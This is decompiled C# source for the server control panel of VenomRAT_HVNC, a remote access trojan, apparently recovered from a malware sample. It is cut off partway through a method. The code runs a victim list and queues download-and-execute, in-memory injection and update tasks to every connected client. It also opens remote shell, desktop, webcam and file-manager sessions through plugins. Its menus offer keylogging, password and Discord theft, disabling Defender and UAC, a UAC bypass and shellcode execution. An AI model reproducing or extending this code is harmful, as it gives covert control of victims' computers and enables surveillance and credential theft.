// Decompiled with JetBrains decompiler
// Type: VenomRAT_HVNC.Server.Form1
// Assembly: VenomRAT_HVNC, Version=5.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 364FC72B-4DB8-403E-BB7F-732199A12380
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-666d190a7059c03b3572dd66e51b8232537a8650bbdcbfbe3f8335c830f3aeae.exe

using cGeoIp;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Microsoft.VisualBasic;
using Server.MessagePack;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using VenomRAT_HVNC.HVNC;
using VenomRAT_HVNC.Server.Algorithm;
using VenomRAT_HVNC.Server.Connection;
using VenomRAT_HVNC.Server.Forms;
using VenomRAT_HVNC.Server.Handle_Packet;
using VenomRAT_HVNC.Server.Helper;

namespace VenomRAT_HVNC.Server
{
  public class Form1 : Form
  {
    private bool trans;
    public cGeoMain cGeoMain = new cGeoMain();
    public static List<AsyncTask> getTasks = new List<AsyncTask>();
    private ListViewColumnSorter lvwColumnSorter;
    public static bool islogin = false;
    private IContainer components;
    private ToolStripMenuItem toolStripMenuItem1;
    private TabControl tabControl122;
    private TabPage tabPage33;
    public ListView listView33;
    private TabPage tabPage44;
    public ListView listView44;
    private ColumnHeader columnHeader4;
    private ColumnHeader columnHeader5;
    private TabPage tabPage11;
    private ContextMenuStrip contextMenuThumbnail;
    private ToolStripMenuItem sTARTToolStripMenuItem;
    private ToolStripMenuItem sTOPToolStripMenuItem;
    public ImageList ThumbnailImageList;
    private ContextMenuStrip contextMenuTasks;
    private ToolStripMenuItem sendFileFromUrlToolStripMenuItem;
    private ToolStripMenuItem downloadAndExecuteToolStripMenuItem;
    private ToolStripMenuItem sENDFILETOMEMORYToolStripMenuItem1;
    private ToolStripMenuItem disableUACToolStripMenuItem1;
    private ToolStripMenuItem disableWDToolStripMenuItem1;
    private ToolStripMenuItem installSchtaskToolStripMenuItem;
    private ToolStripMenuItem uPDATEToolStripMenuItem1;
    private ToolStripMenuItem autoKeyloggerToolStripMenuItem;
    private ToolStripMenuItem fakeBinderToolStripMenuItem;
    private ToolStripSeparator toolStripSeparator4;
    private ToolStripMenuItem dELETETASKToolStripMenuItem;
    private Guna2DragControl guna2DragControl1;
    private Guna2ControlBox guna2ControlBox2;
    private Guna2ControlBox guna2ControlBox1;
    private ToolStripMenuItem FileToolStripMenuItem;
    private ToolStripMenuItem BuilderToolStripMenuItem;
    private ToolStripMenuItem BlockToolStripMenuItem;
    private ToolStripMenuItem SettingToolStripMenuItem;
    private ToolStripMenuItem ExitToolStripMenuItem;
    private ToolStripMenuItem HelpToolStripMenuItem;
    private ToolStripMenuItem DocumentToolStripMenuItem;
    private ToolStripMenuItem AboutToolStripMenuItem;
    private MenuStrip menuStrip1;
    private System.Windows.Forms.Timer ConnectTimeout;
    private System.Windows.Forms.Timer TimerTask;
    public NotifyIcon notifyIcon1;
    private PerformanceCounter performanceCounter2;
    private PerformanceCounter performanceCounter1;
    private ToolStripMenuItem cLEARToolStripMenuItem;
    private ContextMenuStrip contextMenuLogs;
    private System.Windows.Forms.Timer UpdateUI;
    private System.Windows.Forms.Timer ping;
    private ToolStripMenuItem SystemControlToolStripMenuItem;
    private ToolStripMenuItem ClientControlToolStripMenuItem;
    private ToolStripMenuItem UninstallToolStripMenuItem;
    private ToolStripMenuItem UpdateToolStripMenuItem;
    private ToolStripMenuItem RestartToolStripMenuItem1;
    private ToolStripMenuItem StopToolStripMenuItem1;
    private ToolStripMenuItem SystemToolStripMenuItem;
    private ToolStripMenuItem LogoutToolStripMenuItem;
    private ToolStripMenuItem RebootToolStripMenuItem;
    private ToolStripMenuItem ShutDownToolStripMenuItem;
    private ToolStripMenuItem RemoteManagerToolStripMenuItem;
    private ToolStripMenuItem RemoteShellToolStripMenuItem;
    private ToolStripMenuItem RemoteScreenToolStripMenuItem;
    private ToolStripMenuItem RemoteCameraToolStripMenuItem;
    private ToolStripMenuItem remoteRegeditToolStripMenuItem;
    private ToolStripMenuItem FileManagerToolStripMenuItem1;
    private ToolStripMenuItem ProcessManagerToolStripMenuItem;
    private ToolStripMenuItem netstatToolStripMenuItem;
    private ToolStripMenuItem RecordToolStripMenuItem;
    private ToolStripMenuItem RemoteControlToolStripMenuItem;
    private ToolStripMenuItem SendFileToolStripMenuItem1;
    private ToolStripMenuItem fromUrlToolStripMenuItem;
    private ToolStripMenuItem SendFileToDiskToolStripMenuItem;
    private ToolStripMenuItem SendFileToMemoryToolStripMenuItem;
    private ToolStripMenuItem runShellcodeToolStripMenuItem;
    private ToolStripMenuItem VisteWebsiteToolStripMenuItem1;
    private ToolStripMenuItem ChangeWallpaperToolStripMenuItem1;
    private ToolStripMenuItem FileSearchToolStripMenuItem;
    private ToolStripMenuItem MalwareToolStripMenuItem;
    private ToolStripMenuItem DisableWDToolStripMenuItem;
    private ToolStripMenuItem DisableUACToolStripMenuItem;
    private ToolStripMenuItem BypassUACAToolStripMenuItem;
    private ToolStripMenuItem SilentCleanupToolStripMenuItem;
    private ToolStripMenuItem RunasToolStripMenuItem;
    private ToolStripMenuItem hVNCToolStripMenuItem;
    private ToolStripMenuItem InstallToolStripMenuItem;
    private ToolStripMenuItem SchtaskInstallToolStripMenuItem;
    private ToolStripMenuItem SchtaskUninstallToolStripMenuItem;
    private ToolStripMenuItem InformationToolStripMenuItem;
    private ToolStripMenuItem toolStripMenuItem2;
    private ToolStripMenuItem toolStripMenuItem3;
    private ToolStripMenuItem toolStripMenuItem4;
    private ToolStripMenuItem toolStripMenuItem5;
    private ContextMenuStrip contextMenuClient;
    private Panel panel2;
    private StatusStrip statusStrip1;
    private ToolStripStatusLabel toolStripStatusLabel1;
    private ToolStripStatusLabel toolStripStatusLabel2;
    private PictureBox pictureBox1;
    private ToolStripMenuItem builderToolStripMenuItem1;
    private Guna2Separator guna2Separator2;
    private Guna2ResizeBox guna2ResizeBox1;
    private Label label1;
    private Guna2Panel guna2Panel1;
    public ListView listView1;
    private ColumnHeader lv_ip;
    private ColumnHeader lv_country;
    private ColumnHeader lv_group;
    public ColumnHeader lv_hwid;
    private ColumnHeader lv_user;
    private ColumnHeader lv_camera;
    private ColumnHeader lv_os;
    private ColumnHeader lv_version;
    private ColumnHeader lv_ins;
    private ColumnHeader lv_admin;
    private ColumnHeader lv_av;
    public ColumnHeader lv_ping;
    public ColumnHeader lv_act;
    private ToolStripMenuItem passwordRecoveryToolStripMenuItem;
    private ToolStripMenuItem coomingSoonToolStripMenuItem;
    private ToolStripSeparator toolStripSeparator1;
    private ToolStripSeparator toolStripSeparator2;
    private ToolStripSeparator toolStripSeparator3;
    private ToolStripSeparator toolStripSeparator5;
    private ToolStripSeparator toolStripSeparator6;
    private ToolStripSeparator toolStripSeparator7;
    private ToolStripSeparator toolStripSeparator8;
    private ToolStripSeparator toolStripSeparator9;
    private ToolStripSeparator toolStripSeparator10;
    private ToolStripSeparator toolStripSeparator11;
    private ToolStripSeparator toolStripSeparator12;
    private ToolStripSeparator toolStripSeparator13;
    private ToolStripSeparator toolStripSeparator14;
    private ToolStripSeparator toolStripSeparator23;
    private ToolStripSeparator toolStripSeparator24;
    private ToolStripSeparator toolStripSeparator25;
    private ToolStripSeparator toolStripSeparator15;
    private ToolStripSeparator toolStripSeparator16;
    private ToolStripSeparator toolStripSeparator17;
    private ToolStripSeparator toolStripSeparator18;
    private ToolStripSeparator toolStripSeparator19;
    private ToolStripSeparator toolStripSeparator20;
    private ToolStripSeparator toolStripSeparator21;
    private ToolStripSeparator toolStripSeparator22;
    private ToolStripSeparator toolStripSeparator26;
    private ToolStripSeparator toolStripSeparator27;
    private ToolStripSeparator toolStripSeparator28;
    private ToolStripSeparator toolStripSeparator29;
    private ToolStripSeparator toolStripSeparator30;
    private ToolStripSeparator toolStripSeparator31;
    private ToolStripSeparator toolStripSeparator32;
    private ToolStripSeparator toolStripSeparator33;
    private ToolStripSeparator toolStripSeparator34;
    private ToolStripSeparator toolStripSeparator35;
    private ToolStripSeparator toolStripSeparator36;
    private ToolStripMenuItem justForFunToolStripMenuItem;
    private Guna2BorderlessForm guna2BorderlessForm1;
    private ColumnHeader columnHeader1;
    private ToolStripMenuItem moveToHVNCToolStripMenuItem;
    private Guna2Separator guna2Separator1;
    private Guna2Separator guna2Separator4;
    private Label label3;
    private Label label2;
    private ToolStripMenuItem discordToolStripMenuItem;
    private ToolStripMenuItem DiscordRecoveryToolStripMenuItem;
    private ToolStripSeparator toolStripSeparator37;

    public Form1()
    {
      this.InitializeComponent();
      Form1.SetWindowTheme(this.listView1.Handle, "explorer", (string) null);
      this.Opacity = 0.0;
    }

    private void CheckFiles()
    {
      try
      {
        if (!File.Exists(Path.Combine(Application.StartupPath, Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + ".config")))
        {
          int num = (int) MessageBox.Show("Missing " + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + ".config");
          Environment.Exit(0);
        }
        if (!File.Exists(Path.Combine(Application.StartupPath, "Stub\\Client.exe")))
        {
          int num1 = (int) MessageBox.Show("Missing client file, please close your Anti-Virus and unzip again.");
        }
        if (Directory.Exists(Path.Combine(Application.StartupPath, "Stub")))
          return;
        Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Stub"));
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message, "Venom RAT ", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }

    private Clients[] GetSelectedClients()
    {
      List<Clients> clientsList = new List<Clients>();
      this.Invoke((Delegate) (() =>
      {
        lock (Settings.LockListviewClients)
        {
          if (this.listView1.SelectedItems.Count == 0)
            return;
          foreach (ListViewItem selectedItem in this.listView1.SelectedItems)
            clientsList.Add((Clients) selectedItem.Tag);
        }
      }));
      return clientsList.ToArray();
    }

    private Clients[] GetAllClients()
    {
      List<Clients> clientsList = new List<Clients>();
      this.Invoke((Delegate) (() =>
      {
        lock (Settings.LockListviewClients)
        {
          if (this.listView1.Items.Count == 0)
            return;
          foreach (ListViewItem listViewItem in this.listView1.Items)
            clientsList.Add((Clients) listViewItem.Tag);
        }
      }));
      return clientsList.ToArray();
    }

    private async void Connect()
    {
      try
      {
        await Task.Delay(1000);
        string[] array = VenomRAT_HVNC.Server.Properties.Settings.Default.Ports.Split(',');
        string[] strArray = array;
        for (int index = 0; index < strArray.Length; ++index)
        {
          string text = strArray[index];
          if (!string.IsNullOrWhiteSpace(text))
            new Thread(new ParameterizedThreadStart(new Listener().Connect))
            {
              IsBackground = true
            }.Start((object) Convert.ToInt32(text.ToString().Trim()));
          text = (string) null;
        }
        strArray = (string[]) null;
        array = (string[]) null;
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
        Environment.Exit(0);
      }
    }

    private async void Form1_Load(object sender, EventArgs e)
    {
      this.listView1.Columns[1].TextAlign = HorizontalAlignment.Center;
      this.listView1.Columns[2].TextAlign = HorizontalAlignment.Center;
      this.listView1.Columns[3].TextAlign = HorizontalAlignment.Center;
      this.listView1.Columns[4].TextAlign = HorizontalAlignment.Center;
      this.listView1.Columns[5].TextAlign = HorizontalAlignment.Center;
      this.listView1.Columns[6].TextAlign = HorizontalAlignment.Center;
      this.listView1.Columns[7].TextAlign = HorizontalAlignment.Center;
      this.listView1.Columns[8].TextAlign = HorizontalAlignment.Center;
      this.listView1.Columns[9].TextAlign = HorizontalAlignment.Center;
      this.listView1.Columns[10].TextAlign = HorizontalAlignment.Center;
      this.listView1.Columns[11].TextAlign = HorizontalAlignment.Center;
      this.listView1.Columns[12].TextAlign = HorizontalAlignment.Center;
      this.listView1.View = View.Details;
      this.listView1.HideSelection = false;
      this.listView1.OwnerDraw = true;
      this.listView1.BackColor = Color.FromArgb(24, 24, 24);
      this.listView1.DrawColumnHeader += (DrawListViewColumnHeaderEventHandler) ((sender1, args) =>
      {
        Brush brush = (Brush) new SolidBrush(Color.FromArgb(8, 104, 81));
        args.Graphics.FillRectangle(brush, args.Bounds);
        TextRenderer.DrawText((IDeviceContext) args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.WhiteSmoke);
      });
      this.listView1.DrawItem += (DrawListViewItemEventHandler) ((sender1, args) => args.DrawDefault = true);
      this.listView1.DrawSubItem += (DrawListViewSubItemEventHandler) ((sender1, args) => args.DrawDefault = true);
      ListviewDoubleBuffer.Enable(this.listView1);
      ListviewDoubleBuffer.Enable(this.listView33);
      try
      {
        string[] strArray = VenomRAT_HVNC.Server.Properties.Settings.Default.txtBlocked.Split(',');
        for (int index = 0; index < strArray.Length; ++index)
        {
          string text = strArray[index];
          if (!string.IsNullOrWhiteSpace(text))
            Settings.Blocked.Add(text);
          text = (string) null;
        }
        strArray = (string[]) null;
      }
      catch
      {
      }
      this.CheckFiles();
      this.lvwColumnSorter = new ListViewColumnSorter();
      this.listView1.ListViewItemSorter = (IComparer) this.lvwColumnSorter;
      this.Text = Settings.Version ?? "";
      if (!File.Exists(Settings.CertificatePath))
      {
        using (FormCertificate formCertificate = new FormCertificate())
        {
          int num = (int) formCertificate.ShowDialog();
          this.ActiveControl = (Control) null;
        }
      }
      else
        Settings.ServerCertificate = new X509Certificate2(Settings.CertificatePath);
      using (FormPorts formPorts = new FormPorts())
      {
        int num = (int) formPorts.ShowDialog();
      }
      await Methods.FadeIn((Form) this, 5);
      this.trans = true;
      if (VenomRAT_HVNC.Server.Properties.Settings.Default.Notification)
        this.toolStripStatusLabel2.ForeColor = Color.Gainsboro;
      else
        this.toolStripStatusLabel2.ForeColor = Color.Gainsboro;
      new Thread((ThreadStart) (() => this.Connect())).Start();
    }

    private void Form1_Activated(object sender, EventArgs e)
    {
      if (!this.trans)
        return;
      this.Opacity = 1.0;
    }

    private void Form1_Deactivate(object sender, EventArgs e) => this.Opacity = 0.95;

    private void Form1_FormClosed(object sender, FormClosedEventArgs e)
    {
      this.notifyIcon1.Dispose();
      Environment.Exit(0);
    }

    private void listView1_KeyDown(object sender, KeyEventArgs e)
    {
      if (this.listView1.Items.Count <= 0 || e.Modifiers != Keys.Control || e.KeyCode != Keys.A)
        return;
      foreach (ListViewItem listViewItem in this.listView1.Items)
        listViewItem.Selected = true;
    }

    private void listView1_MouseMove(object sender, MouseEventArgs e)
    {
      if (this.listView1.Items.Count <= 1)
        return;
      ListViewHitTestInfo listViewHitTestInfo = this.listView1.HitTest(e.Location);
      if (e.Button == MouseButtons.Left && (listViewHitTestInfo.Item != null || listViewHitTestInfo.SubItem != null))
        this.listView1.Items[listViewHitTestInfo.Item.Index].Selected = true;
    }

    private void ListView1_ColumnClick(object sender, ColumnClickEventArgs e)
    {
      if (e.Column == this.lvwColumnSorter.SortColumn)
      {
        this.lvwColumnSorter.Order = this.lvwColumnSorter.Order != SortOrder.Ascending ? SortOrder.Ascending : SortOrder.Descending;
      }
      else
      {
        this.lvwColumnSorter.SortColumn = e.Column;
        this.lvwColumnSorter.Order = SortOrder.Ascending;
      }
      this.listView1.Sort();
    }

    private void ping_Tick(object sender, EventArgs e)
    {
      if (this.listView1.Items.Count <= 0)
        return;
      MsgPack msgPack = new MsgPack();
      msgPack.ForcePathObject("Pac_ket").AsString = "Ping";
      msgPack.ForcePathObject("Message").AsString = "This is a ping!";
      foreach (Clients allClient in this.GetAllClients())
        ThreadPool.QueueUserWorkItem(new WaitCallback(allClient.Send), (object) msgPack.Encode2Bytes());
      GC.Collect();
    }

    private void UpdateUI_Tick(object sender, EventArgs e)
    {
      this.Text = Settings.Version + "     " + DateTime.Now.ToLongTimeString();
      lock (Settings.LockListviewClients)
        this.toolStripStatusLabel1.Text = string.Format("Online {0}                                 Selected Clients {1}                                      Sent {2}                                        Received  {3}                                         CPU {4}%                                      Memory {5}%", (object) this.listView1.Items.Count.ToString(), (object) this.listView1.SelectedItems.Count.ToString(), (object) Methods.BytesToString(Settings.SentValue).ToString(), (object) Methods.BytesToString(Settings.ReceivedValue).ToString(), (object) (int) this.performanceCounter1.NextValue(), (object) (int) this.performanceCounter2.NextValue());
    }

    private void CLEARToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        lock (Settings.LockListviewLogs)
          ;
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void STARTToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.listView1.Items.Count <= 0)
        return;
      MsgPack msgPack1 = new MsgPack();
      msgPack1.ForcePathObject("Pac_ket").AsString = "thumbnails";
      MsgPack msgPack2 = new MsgPack();
      msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
      msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
      msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
      foreach (Clients allClient in this.GetAllClients())
        ThreadPool.QueueUserWorkItem(new WaitCallback(allClient.Send), (object) msgPack2.Encode2Bytes());
    }

    private void STOPToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.listView1.Items.Count > 0)
        {
          MsgPack msgPack = new MsgPack();
          msgPack.ForcePathObject("Pac_ket").AsString = "thumbnailsStop";
          foreach (ListViewItem listViewItem in this.listView33.Items)
            ThreadPool.QueueUserWorkItem(new WaitCallback(((Clients) listViewItem.Tag).Send), (object) msgPack.Encode2Bytes());
        }
        this.listView33.Items.Clear();
        this.ThumbnailImageList.Images.Clear();
        foreach (ListViewItem listViewItem in this.listView1.Items)
          ((Clients) listViewItem.Tag).LV2 = (ListViewItem) null;
      }
      catch
      {
      }
    }

    private void DELETETASKToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.listView44.SelectedItems.Count <= 0)
        return;
      foreach (ListViewItem selectedItem in this.listView44.SelectedItems)
        selectedItem.Remove();
    }

    private async void TimerTask_Tick(object sender, EventArgs e)
    {
      try
      {
        Clients[] clients = this.GetAllClients();
        if (Form1.getTasks.Count > 0 && clients.Length != 0)
        {
          foreach (AsyncTask asyncTask1 in Form1.getTasks.ToList<AsyncTask>())
          {
            AsyncTask asyncTask = asyncTask1;
            if (!this.GetListview(asyncTask.id))
            {
              Form1.getTasks.Remove(asyncTask);
              return;
            }
            Clients[] clientsArray = clients;
            for (int index = 0; index < clientsArray.Length; ++index)
            {
              Clients clients2 = clientsArray[index];
              if (!asyncTask.doneClient.Contains(clients2.ID))
              {
                if (clients2.Admin)
                {
                  asyncTask.doneClient.Add(clients2.ID);
                  this.SetExecution(asyncTask.id);
                  ThreadPool.QueueUserWorkItem(new WaitCallback(clients2.Send), (object) asyncTask.msgPack);
                }
                else if (!clients2.Admin && !asyncTask.admin)
                {
                  asyncTask.doneClient.Add(clients2.ID);
                  this.SetExecution(asyncTask.id);
                  ThreadPool.QueueUserWorkItem(new WaitCallback(clients2.Send), (object) asyncTask.msgPack);
                }
              }
              clients2 = (Clients) null;
            }
            clientsArray = (Clients[]) null;
            await Task.Delay(15000);
            asyncTask = (AsyncTask) null;
          }
          List<AsyncTask>.Enumerator enumerator = new List<AsyncTask>.Enumerator();
          enumerator = new List<AsyncTask>.Enumerator();
        }
        clients = (Clients[]) null;
        clients = (Clients[]) null;
      }
      catch
      {
      }
    }

    private void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        OpenFileDialog openFileDialog = new OpenFileDialog();
        if (openFileDialog.ShowDialog() != DialogResult.OK)
          return;
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "sendFile";
        msgPack1.ForcePathObject("Update").AsString = "false";
        msgPack1.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
        msgPack1.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        ListViewItem listViewItem1 = new ListViewItem();
        listViewItem1.Text = "SendFile: " + Path.GetFileName(openFileDialog.FileName);
        listViewItem1.SubItems.Add("0");
        listViewItem1.ToolTipText = Guid.NewGuid().ToString();
        if (this.listView44.Items.Count > 0)
        {
          foreach (ListViewItem listViewItem2 in this.listView44.Items)
          {
            if (listViewItem2.Text == listViewItem1.Text)
              return;
          }
        }
        Program.form1.listView44.Items.Add(listViewItem1);
        Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
        Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem1.ToolTipText, false));
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void SENDFILETOMEMORYToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        FormSendFileToMemory sendFileToMemory = new FormSendFileToMemory();
        int num = (int) sendFileToMemory.ShowDialog();
        if (sendFileToMemory.toolStripStatusLabel1.Text.Length > 0 && sendFileToMemory.toolStripStatusLabel1.ForeColor == Color.Green)
        {
          MsgPack msgPack1 = new MsgPack();
          msgPack1.ForcePathObject("Pac_ket").AsString = "sendMemory";
          msgPack1.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(sendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
          msgPack1.ForcePathObject("Inject").AsString = sendFileToMemory.comboBox1.SelectedIndex != 0 ? sendFileToMemory.comboBox2.Text : "";
          ListViewItem listViewItem1 = new ListViewItem();
          listViewItem1.Text = "SendMemory: " + Path.GetFileName(sendFileToMemory.toolStripStatusLabel1.Tag.ToString());
          listViewItem1.SubItems.Add("0");
          listViewItem1.ToolTipText = Guid.NewGuid().ToString();
          MsgPack msgPack2 = new MsgPack();
          msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
          msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
          msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
          if (this.listView44.Items.Count > 0)
          {
            foreach (ListViewItem listViewItem2 in this.listView44.Items)
            {
              if (listViewItem2.Text == listViewItem1.Text)
                return;
            }
          }
          Program.form1.listView44.Items.Add(listViewItem1);
          Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
          Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem1.ToolTipText, false));
        }
        sendFileToMemory.Close();
        sendFileToMemory.Dispose();
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void UPDATEToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        OpenFileDialog openFileDialog = new OpenFileDialog();
        if (openFileDialog.ShowDialog() != DialogResult.OK)
          return;
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "sendFile";
        msgPack1.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
        msgPack1.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
        msgPack1.ForcePathObject("Update").AsString = "true";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        ListViewItem listViewItem1 = new ListViewItem();
        listViewItem1.Text = "Update: " + Path.GetFileName(openFileDialog.FileName);
        listViewItem1.SubItems.Add("0");
        listViewItem1.ToolTipText = Guid.NewGuid().ToString();
        if (this.listView44.Items.Count > 0)
        {
          foreach (ListViewItem listViewItem2 in this.listView44.Items)
          {
            if (listViewItem2.Text == listViewItem1.Text)
              return;
          }
        }
        Program.form1.listView44.Items.Add(listViewItem1);
        Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
        Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem1.ToolTipText, false));
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private bool GetListview(string id)
    {
      foreach (ListViewItem listViewItem in Program.form1.listView44.Items)
      {
        if (listViewItem.ToolTipText == id)
          return true;
      }
      return false;
    }

    private void SetExecution(string id)
    {
      foreach (ListViewItem listViewItem in Program.form1.listView44.Items)
      {
        if (listViewItem.ToolTipText == id)
        {
          int num = Convert.ToInt32(listViewItem.SubItems[1].Text) + 1;
          listViewItem.SubItems[1].Text = num.ToString();
        }
      }
    }

    [DllImport("uxtheme", CharSet = CharSet.Unicode)]
    public static extern int SetWindowTheme(
      IntPtr hWnd,
      string textSubAppName,
      string textSubIdList);

    private void builderToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      using (FormBuilder formBuilder = new FormBuilder())
      {
        int num = (int) formBuilder.ShowDialog();
      }
    }

    private void aboutToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      using (FormAbout formAbout = new FormAbout())
      {
        int num = (int) formAbout.ShowDialog();
      }
    }

    private void RemoteShellToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "shell";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if ((FormShell) Application.OpenForms["shell:" + selectedClient.ID] == null)
          {
            FormShell formShell = new FormShell();
            formShell.Name = "shell:" + selectedClient.ID;
            formShell.Text = "shell:" + selectedClient.ID;
            formShell.F = this;
            formShell.Show();
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void RemoteScreenToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RemoteDesktop.dll");
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if ((FormRemoteDesktop) Application.OpenForms["RemoteDesktop:" + selectedClient.ID] == null)
          {
            FormRemoteDesktop formRemoteDesktop = new FormRemoteDesktop();
            formRemoteDesktop.Name = "RemoteDesktop:" + selectedClient.ID;
            formRemoteDesktop.F = this;
            formRemoteDesktop.Text = "RemoteDesktop:" + selectedClient.ID;
            formRemoteDesktop.ParentClient = selectedClient;
            formRemoteDesktop.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", selectedClient.ID, "RemoteDesktop");
            formRemoteDesktop.Show();
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack.Encode2Bytes());
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void RemoteCameraToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.listView1.SelectedItems.Count <= 0)
          return;
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RemoteCamera.dll");
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if ((FormWebcam) Application.OpenForms["Webcam:" + selectedClient.ID] == null)
          {
            FormWebcam formWebcam = new FormWebcam();
            formWebcam.Name = "Webcam:" + selectedClient.ID;
            formWebcam.F = this;
            formWebcam.Text = "Webcam:" + selectedClient.ID;
            formWebcam.ParentClient = selectedClient;
            formWebcam.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", selectedClient.ID, "Camera");
            formWebcam.Show();
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack.Encode2Bytes());
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FileManager.dll");
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if ((FormFileManager) Application.OpenForms["fileManager:" + selectedClient.ID] == null)
          {
            FormFileManager formFileManager = new FormFileManager();
            formFileManager.Name = "fileManager:" + selectedClient.ID;
            formFileManager.Text = "fileManager:" + selectedClient.ID;
            formFileManager.F = this;
            formFileManager.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", selectedClient.ID);
            formFileManager.Show();
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack.Encode2Bytes());
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void ProcessManagerToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
